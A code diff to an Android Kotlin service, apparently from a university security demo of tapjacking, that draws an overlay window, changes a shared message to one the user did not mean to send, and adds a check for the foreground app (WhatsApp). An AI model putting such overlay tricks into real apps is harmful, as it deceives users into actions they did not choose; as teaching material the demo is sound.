@@ -1,9 +1,12 @@
 package ar.edu.unq.seguridad.tapjacking
 
+import android.app.Activity
+import android.app.ActivityManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.graphics.PixelFormat
+import android.os.Handler
 import android.os.IBinder
 import android.view.LayoutInflater
 import android.view.View
@@ -11,6 +14,7 @@ import android.view.ViewGroup
 import android.view.WindowManager
 import android.view.WindowManager.LayoutParams.*
 import android.widget.LinearLayout
+import android.widget.Toast
 import kotlin.properties.Delegates
 
 public class OverlayService : Service() {
@@ -38,7 +42,15 @@ public class OverlayService : Service() {
         }
         (getSystemService(Context.WINDOW_SERVICE) as WindowManager).addView(overlay, params)
 
-        sendText("Texto que quiero compartir")
+        sendText("Texto que [no] quiero compartir")
+    }
+
+    private fun checkForWhatsapp() {
+        Handler().postDelayed({
+            val am = getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+            val packageName = am.getRunningTasks(1).get(0).topActivity.getPackageName()
+            Toast.makeText(getApplicationContext(), packageName, Toast.LENGTH_SHORT).show()
+        },2000)
     }
 
     private fun sendText(text:String) {
